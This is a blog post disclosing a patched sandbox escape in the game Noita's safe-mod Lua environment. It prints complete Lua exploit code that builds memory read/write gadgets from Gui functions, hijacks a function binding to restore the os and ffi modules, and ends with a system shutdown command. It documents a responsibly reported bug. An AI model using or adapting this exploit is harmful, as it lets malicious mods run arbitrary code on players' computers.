<!doctype html>

<html lang="en">

<head>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Finding a Vulnerability in Noita | DD</title>

<link href="/static/css/bootstrap.min.css" rel="stylesheet">
<link href="/static/css/code-highlight.css" rel="stylesheet">
<link href="/static/css/dexsite.css" rel="stylesheet">



<meta name="description" content="Crafting a Lua exploit from read/write gadgets.">
<meta name="author" content="Dexter Castor Döpping">
<meta name="keywords" content="Game hacking, Noita, Lua">

</head>

<body>

<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
  <div class="container-fluid">
    <a class="navbar-brand" href="/index.html">DD</a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-main" aria-controls="navbar-main" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbar-main">
      <ul class="navbar-nav">
        <li class="nav-item"><a class="nav-link" href="/index.html">Home</a>
        <li class="nav-item"><a class="nav-link" href="/about.html">About</a>
      </ul>
    </div>
  </div>
</nav>

<main class="container mt-2">



<article class="blog-post" lang="en">
<h1>Finding a Vulnerability in Noita</h1>
<div class="post-info" lang="en">
    <span class="post-info-item"><strong>By</strong>: Dexter Castor Döpping</span>
    <span class="post-info-item"><strong>Published</strong>: 2023-03-04</span>
</div>

<p>A while back I was reversing Noita using Ghidra and happened upon some weird looking functions.
They seemed like perfect candidates for doing arbitrary memory reads/writes that could then be used for privilege escalation.
I played around with them for a bit to confirm the suspicions I had,
but gave up on making a working exploit because of some hurdles I ran into.</p>
<p>But like sometimes happens, I couldn't get the idea of making a working exploit out of my head
so I eventually revisited it.</p>
<h2 id="background-info">Background Info</h2>
<p>Noita has official modding support allowing people to create a couple different kind of mods.
For this post to make sense you need to know about <em>safe</em> mods and <strong><em>unsafe</em></strong> mods.</p>
<h3 id="safe-mods">Safe Mods</h3>
<p>A lot of Noita's content is implemented in Lua which the scripting language that's also used for mods.
Lua is a great choice for this kind of stuff because it's designed for embedding inside of other programs.</p>
<p>The environment in which the Lua code runs is determined by the host program.
The host can define custom functions that make sense for its domain and
Lua also comes with a bunch of standard libraries.
Ultimately, the host program decides what should and shouldn't be available.
Take for instance the standard function <code>os.execute</code>.
This can be used to run arbitrary programs, but we probably don't want mods to be able to do that.</p>
<p>With <code>os.execute</code>, mods can steal your passwords and personal information, install keyloggers, and turn off your computer.
People generally find these things unpleasant which is why we have safe mods.
With safe mode, we don't worry about if the mod maker is malicious,
since the mod runs in a Lua environment stripped of anything that could pose a risk.</p>
<h3 id="unsafe-mods">Unsafe Mods</h3>
<p>Safe mods are great, but what <em>if</em> we have a reason to do something unusual?
Let's say I want to share something that's happening in the game over the internet with other people?
That could be fun and interesting, but the game can't tell whether the mod is sharing how many enemies you defeated or your credit card info.</p>
<p>This is why there is unsafe mode. It'd be cool if these things were possible, but it shouldn't be available by default.
Before a user can enable an unsafe mod they must toggle a setting that explains the risks.
This way, hopefully, the user understands the risks and considers whether they trust the mod author before enabling an unsafe mod.</p>
<p><img alt='Noita user interface saying "Enabling unsafe mods gives all installed mods full
access to your computer. Are you sure?"' src="/static/img/unsafe_mod_warning.png"/></p>
<p>Unsafe mods also can't be shared through the Steam Workshop.
This naturally discourages you from using unsafe mode unless it's absolutely required
since not as many people will see and download your mod</p>
<p>I really appreciate that the developers created a safe and unsafe mode.
They wanted to make using mods safe but still gave us a way to do cool things that wouldn't be possible without unsafe mode.</p>
<h2 id="what-if">What If?</h2>
<p>Alright, great! but… what if we can break these rules? Well, we can (or rather <em>could</em>).</p>
<p>Unsafe mods require caution but safe mods should be usable without any concern, but
in reality with some carefully crafted code we can remove the restrictions of safe mode.</p>
<h3 id="overview">Overview</h3>
<p>The exploit is based around Noita's Gui* functions,
these functions are supposed to only accept values created via <code>GuiCreate()</code> these
are <code>lightuserdata</code> values which are simply pointers to some internal <code>GuiContext</code> structure.</p>
<p>But to turn the gui context argument back into a pointer Noita uses the <code>lua_topointer</code> function,
here's the documentation for that function:</p>
<blockquote>
<p><code>const void *lua_topointer (lua_State *L, int index);</code></p>
<p>Converts the value at the given acceptable index to a generic C pointer (void*).
The value can be a userdata, a table, a thread, or a function; otherwise, lua_topointer returns NULL.
Different objects will give different pointers.
There is no way to convert the pointer back to its original value.</p>
<p>Typically this function is used only for debug information. </p>
</blockquote>
<p>Now that's interesting, <code>lua_topointer</code> doesn't just accept <code>userdata</code> values,
we can also pass in tables and other things..
If we can use this to write into LuaJIT data structures then we can make an exploit!</p>
<h3 id="exploit">Exploit</h3>
<p>Since we're going to write and read from memory we need to deal with binary data somehow.
Lua 5.1 has a single number type which is a double width floating point number.
There's no clear mapping between the number's bits and its floating point value but
this is the best way to place our desired binary numbers into memory.</p>
<p>While there's no <em>clear</em> mapping, it is possible to place specific bits in memory.
Playing around with <a href="https://float.exposed/">float.exposed</a> helped a lot here.</p>
<div class="codehilite"><pre><span></span><code><span class="c1">-- This function takes a floating point value, and turns it into a floating</span>
<span class="c1">-- point value whose binary representation matches the first floating point</span>
<span class="c1">-- value.</span>
<span class="c1">--</span>
<span class="c1">-- For instance, the floating point number (A) 305419896.0 (hex 0x12345680) is encoded like this: 0x4d91a2b4</span>
<span class="c1">-- The floating point number (B) 5.69046046576341273665e-28 is encoded like this: 0x12345680</span>
<span class="c1">--</span>
<span class="c1">-- The function takes the number A and turns it into the number B.</span>
<span class="c1">--</span>
<span class="c1">-- This is used to place specific binary values into memory.</span>
<span class="kr">function</span><span class="w"> </span><span class="nf">as_float</span><span class="p">(</span><span class="nv">number</span><span class="p">)</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">sign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">bit</span><span class="p">.</span><span class="nf">band</span><span class="p">(</span><span class="mh">0x80000000</span><span class="p">,</span><span class="w"> </span><span class="nv">number</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">exp_</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">bit</span><span class="p">.</span><span class="nf">rshift</span><span class="p">(</span><span class="nv">bit</span><span class="p">.</span><span class="nf">band</span><span class="p">(</span><span class="mh">0x7f800000</span><span class="p">,</span><span class="w"> </span><span class="nv">number</span><span class="p">),</span><span class="w"> </span><span class="mi">23</span><span class="p">)</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">sig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">bit</span><span class="p">.</span><span class="nf">band</span><span class="p">(</span><span class="mh">0x7fffff</span><span class="p">,</span><span class="w"> </span><span class="nv">number</span><span class="p">)</span>

<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">leading</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">exp_</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="mi">1</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">exponent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">exp_</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="o">-</span><span class="mi">126</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="nv">exp_</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">127</span>

<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="nv">sign</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="nv">leading</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">sig</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mh">0x800000</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="o">^</span><span class="nv">exponent</span>
<span class="kr">end</span>

<span class="c1">-- Reverse of as_float.</span>
<span class="kr">function</span><span class="w"> </span><span class="nf">as_u32</span><span class="p">(</span><span class="nv">number</span><span class="p">,</span><span class="w"> </span><span class="nv">debug</span><span class="p">)</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">absnum</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">math.abs</span><span class="p">(</span><span class="nv">number</span><span class="p">)</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">sig</span><span class="p">,</span><span class="w"> </span><span class="nv">exp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">math.frexp</span><span class="p">(</span><span class="nv">absnum</span><span class="p">)</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">sign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">number</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span>
<span class="w">    </span><span class="nv">exp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">exp</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span>

<span class="w">    </span><span class="kr">if</span><span class="w"> </span><span class="nv">exp</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">-</span><span class="mi">126</span><span class="w"> </span><span class="kr">then</span>
<span class="w">        </span><span class="nv">sig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">sig</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">(</span><span class="o">-</span><span class="mi">127</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">exp</span><span class="p">)</span>
<span class="w">        </span><span class="nv">sig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">sig</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x800000</span>
<span class="w">        </span><span class="nv">exp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">127</span>
<span class="w">    </span><span class="kr">else</span>
<span class="w">        </span><span class="nv">sig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nv">sig</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x800000</span>
<span class="w">    </span><span class="kr">end</span>

<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span>
<span class="w">    </span><span class="nv">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">bit</span><span class="p">.</span><span class="nf">bor</span><span class="p">(</span><span class="nv">ret</span><span class="p">,</span><span class="w"> </span><span class="nv">bit</span><span class="p">.</span><span class="nf">lshift</span><span class="p">(</span><span class="nv">bit</span><span class="p">.</span><span class="nf">band</span><span class="p">(</span><span class="nv">exp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">127</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">),</span><span class="w"> </span><span class="mi">23</span><span class="p">))</span>
<span class="w">    </span><span class="nv">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">bit</span><span class="p">.</span><span class="nf">bor</span><span class="p">(</span><span class="nv">ret</span><span class="p">,</span><span class="w"> </span><span class="nv">bit</span><span class="p">.</span><span class="nf">band</span><span class="p">(</span><span class="nv">sig</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7fffff</span><span class="p">))</span>

<span class="w">    </span><span class="kr">if</span><span class="w"> </span><span class="nv">sign</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w"> </span><span class="kr">then</span>
<span class="w">        </span><span class="nv">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">ret</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x80000000</span>
<span class="w">    </span><span class="kr">end</span>

<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="nv">ret</span>
<span class="kr">end</span>
</code></pre></div>
<p>These function can't deal with all number (e.g. NaNs) but it's good enough.</p>
<p>LuaJIT's stringify function can give us the addresses of tables and functions,
we'll need that later on so we define some utility functions.</p>
<div class="codehilite"><pre><span></span><code><span class="c1">-- Given a function, return the address in its string representation</span>
<span class="c1">-- (e.g. f -&gt; "function: 0x2ac3a150" -&gt; 0x2ac3a150)</span>
<span class="kr">function</span><span class="w"> </span><span class="nf">funaddr</span><span class="p">(</span><span class="nv">f</span><span class="p">)</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="nb">tonumber</span><span class="p">(</span><span class="nb">tostring</span><span class="p">(</span><span class="nv">f</span><span class="p">):</span><span class="nf">sub</span><span class="p">(</span><span class="mi">13</span><span class="p">),</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span>
<span class="kr">end</span>

<span class="c1">-- t -&gt; "table: 0x2af18f88" -&gt; 0x2af18f88</span>
<span class="kr">function</span><span class="w"> </span><span class="nf">tabaddr</span><span class="p">(</span><span class="nv">t</span><span class="p">)</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="nb">tonumber</span><span class="p">(</span><span class="nb">tostring</span><span class="p">(</span><span class="nv">t</span><span class="p">):</span><span class="nf">sub</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span>
<span class="kr">end</span>

<span class="c1">-- Offsets to interesting parts of LuaJIT internal structures.</span>
<span class="kd">local</span><span class="w"> </span><span class="nv">tab_sz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">40</span>
<span class="kd">local</span><span class="w"> </span><span class="nv">fun_sz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">20</span>
</code></pre></div>
<p>Now for the fun part.
We now start misusing the Gui functions to construct new lightuserdata values.</p>
<p>LuaJIT will place table elements straight after the table if there aren't too many elements.
With this fact, and by finding a function that writes far enough into what's supposed to be the GuiContext,
we can construct new lightuserdata values.</p>
<p>The only function I could get to work was GuiColorSetForNextWidget since no other function writes far enough.
This function also clobbers some other internal fields of the Lua table, but
we only need to call it once to make it possible to use a more surgical memory writing function.</p>
<div class="codehilite"><pre><span></span><code><span class="c1">-- The lightuserdata value that we write into to create new memory addresses.</span>
<span class="kd">local</span><span class="w"> </span><span class="nv">lud</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">GuiCreate</span><span class="p">()</span><span class="nf">GuiDestroy</span><span class="p">(</span><span class="nv">lud</span><span class="p">)</span>

<span class="c1">-- Corruption is done by writing into a GCTab's colocated array part.</span>
<span class="c1">-- See LuaJIT src/lj_tab.c:newtab</span>
<span class="kd">local</span><span class="w"> </span><span class="nv">w</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="nv">lud</span><span class="p">}</span>

<span class="c1">-- I was only able to start the exploit using GuiColorSetForNextWidget but that</span>
<span class="c1">-- clobbers some of the fields at the end of the GCTab struct.  To avoid</span>
<span class="c1">-- instability this is used only once to setup a more reliable arbitrary write</span>
<span class="c1">-- gadget with GuiZSet.</span>
<span class="kr">function</span><span class="w"> </span><span class="nf">get_w_writer</span><span class="p">()</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="nv">lud</span><span class="p">}</span>
<span class="w">    </span><span class="nf">GuiColorSetForNextWidget</span><span class="p">(</span><span class="nv">to</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nf">as_float</span><span class="p">(</span><span class="nf">tabaddr</span><span class="p">(</span><span class="nv">w</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">tab_sz</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x2c</span><span class="p">))</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="nv">to</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="kr">end</span>

<span class="c1">-- We can now use t with GuiZSet to create arbitrary lightuserdata values in the</span>
<span class="c1">-- w table.</span>
<span class="kd">local</span><span class="w"> </span><span class="nv">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">get_w_writer</span><span class="p">()</span>
</code></pre></div>
<p>The lightuserdata value created in <code>get_w_writer()</code> is offset by -0x2c from <code>w</code>,
this is the difference of how far <code>GuiZSet</code> writes and the offset from which the colocated table elements are located from the start of the table structure.</p>
<p>We now have everything setup for our next utilities.</p>
<div class="codehilite"><pre><span></span><code><span class="c1">-- Construct pointer with proper offset for use with GuiZSet writing.</span>
<span class="kr">function</span><span class="w"> </span><span class="nf">get_write_ptr</span><span class="p">(</span><span class="nv">ptr</span><span class="p">)</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="nf">get_ptr</span><span class="p">(</span><span class="nv">ptr</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x2c</span><span class="p">)</span>
<span class="kr">end</span>

<span class="c1">-- Construct pointer with proper offset for use with GuiGetPreviousWidgetInfo reading.</span>
<span class="kr">function</span><span class="w"> </span><span class="nf">get_read_ptr</span><span class="p">(</span><span class="nv">ptr</span><span class="p">)</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="nf">get_ptr</span><span class="p">(</span><span class="nv">ptr</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x5c</span><span class="p">)</span>
<span class="kr">end</span>

<span class="c1">-- Helper function for construction the lightuserdata values (pointers).</span>
<span class="kr">function</span><span class="w"> </span><span class="nf">get_ptr</span><span class="p">(</span><span class="nv">ptr</span><span class="p">)</span>
<span class="w">    </span><span class="nf">GuiZSet</span><span class="p">(</span><span class="nv">t</span><span class="p">,</span><span class="w"> </span><span class="nf">as_float</span><span class="p">(</span><span class="nv">ptr</span><span class="p">))</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="nv">w</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="kr">end</span>

<span class="c1">-- Helper function to write `value` into `ptr`.</span>
<span class="kr">function</span><span class="w"> </span><span class="nf">write_value</span><span class="p">(</span><span class="nv">ptr</span><span class="p">,</span><span class="w"> </span><span class="nv">value</span><span class="p">)</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">real_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">get_write_ptr</span><span class="p">(</span><span class="nv">ptr</span><span class="p">)</span>
<span class="w">    </span><span class="nf">GuiZSet</span><span class="p">(</span><span class="nv">real_ptr</span><span class="p">,</span><span class="w"> </span><span class="nf">as_float</span><span class="p">(</span><span class="nv">value</span><span class="p">))</span>
<span class="kr">end</span>

<span class="c1">-- Helper function to read from `ptr`.</span>
<span class="kr">function</span><span class="w"> </span><span class="nf">read_value</span><span class="p">(</span><span class="nv">ptr</span><span class="p">)</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">real_ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">get_read_ptr</span><span class="p">(</span><span class="nv">ptr</span><span class="p">)</span>
<span class="w">    </span><span class="kd">local</span><span class="w"> </span><span class="nv">_</span><span class="p">,</span><span class="w"> </span><span class="nv">_</span><span class="p">,</span><span class="w"> </span><span class="nv">_</span><span class="p">,</span><span class="w"> </span><span class="nv">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">GuiGetPreviousWidgetInfo</span><span class="p">(</span><span class="nv">real_ptr</span><span class="p">)</span>
<span class="w">    </span><span class="kr">return</span><span class="w"> </span><span class="nf">as_u32</span><span class="p">(</span><span class="nv">result</span><span class="p">)</span>
<span class="kr">end</span>
</code></pre></div>
<p>Constructing new lightuserdata values is done by writing into the <code>w</code> array using <code>GuiZSet</code> and then simply retrieving new the value.
Once we have a lightuserdata object we use that to read or write from memory.</p>
<p>We can write values using <code>GuiZSet</code> and read them using <code>GuiGetPreviousWidgetInfo</code>
these functions do their reads/writes from different pointer offsets but that's easy enough to deal with.</p>
<p>We want to gain full unrestricted Lua access, to do that we need to call the <code>luaopen_package</code> Lua C function somehow.
So far we've been writing into tables but for the final part of this exploit we redirect an existing C function binding in the Lua context.</p>
<p>Since Noita doesn't call <code>luaopen_package</code> there's no IAT entry for it but we can rely on the fact that
this function is a certain distance away from another function in the LuaJIT DLL that Noita <em>does</em> call.</p>
<div class="codehilite"><pre><span></span><code><span class="c1">-- We want the luaopen_package function but we can't easily get a pointer to that</span>
<span class="c1">-- function because it's never called by Noita itself. Instead, we get a pointer</span>
<span class="c1">-- to luaopen_string and use the fact that the luaopen_package function is a certain</span>
<span class="c1">-- distance away from this function.</span>
<span class="kd">local</span><span class="w"> </span><span class="nv">luaopen_string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">read_value</span><span class="p">(</span><span class="mh">0x00d1e788</span><span class="p">)</span>
<span class="kd">local</span><span class="w"> </span><span class="nv">luaopen_package</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">luaopen_string</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">5712</span>

<span class="c1">-- We're corrupting an existing GCfuncC struct. We do this to a function that is</span>
<span class="c1">-- normally useless.</span>
<span class="kd">local</span><span class="w"> </span><span class="nv">target</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nf">funaddr</span><span class="p">(</span><span class="nv">SetPlayerSpawnLocation</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">fun_sz</span>

<span class="c1">-- Turn SetPlayerSpawnLocation into luaopen_package.</span>
<span class="c1">-- Writing to GCfuncC.f (See LuaJIT src/lj_obj.h:GCfuncC)</span>
<span class="nf">write_value</span><span class="p">(</span><span class="nv">target</span><span class="p">,</span><span class="w"> </span><span class="nv">luaopen_package</span><span class="p">)</span>

<span class="c1">-- SetPlayerSpawnLocation is now actually luaopen_package. Wheeeee!</span>
<span class="nf">SetPlayerSpawnLocation</span><span class="p">()</span>

<span class="c1">-- We can now use package.loadlib to load anything we want.</span>
<span class="kd">local</span><span class="w"> </span><span class="nv">ffi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">package.loadlib</span><span class="p">(</span><span class="s2">"lua51.dll"</span><span class="p">,</span><span class="w"> </span><span class="s2">"luaopen_ffi"</span><span class="p">)()</span>
<span class="kd">local</span><span class="w"> </span><span class="nv">os</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">package.loadlib</span><span class="p">(</span><span class="s2">"lua51.dll"</span><span class="p">,</span><span class="w"> </span><span class="s2">"luaopen_os"</span><span class="p">)()</span>

<span class="c1">-- TODO: Evil stuff</span>
<span class="nb">os.execute</span><span class="p">(</span><span class="s2">"shutdown /s /t 0"</span><span class="p">)</span>
</code></pre></div>
<p>And that's it. We redirect an existing function to <code>luaopen_package</code>, call it, and
from that point on we can use the <code>package.*</code> module from Lua like normal.
Once we have that we can load any module like <code>os</code> or <code>ffi</code>.
Pretty cool, right?</p>
<h2 id="closing-thoughts">Closing thoughts</h2>
<p>I reported this security vulnerability on the 18th of February 2023 and didn't really expect anything to be done with it.
Noita hadn't seen an update since April of 2021 and would the devs find this important enough to come back and fix it?</p>
<p>Apparently the answer is yes! And they also took this "opportunity" to fix some of the bugs that the community had been running into.
I'm very grateful that the devs did this, and am proud that I, in a way, contributed to this.</p>
<p><img alt='Screenshot of the 28th of February 2023 release notes where the last line is
BUGFIX: "Fixed a security vulnerability in the modding API (Thank you Dexter Castor Döpping)"' src="/static/img/noita_vulnerability_update_notes.png"/></p>
</article>



</main>

<footer class="py-3 my-4">
  <ul class="nav justify-content-center border-bottom pb-3 mb-3">
    <li class="nav-item"><a href="/index.html" class="nav-link px-2 text-muted">Home</a></li>
    <li class="nav-item"><a href="/about.html" class="nav-link px-2 text-muted">About</a></li>
  </ul>
  <p class="text-center text-muted">Dexter Castor Döpping</p>
</footer>

<script src="/static/js/bootstrap.bundle.min.js"></script>
</body>

</html>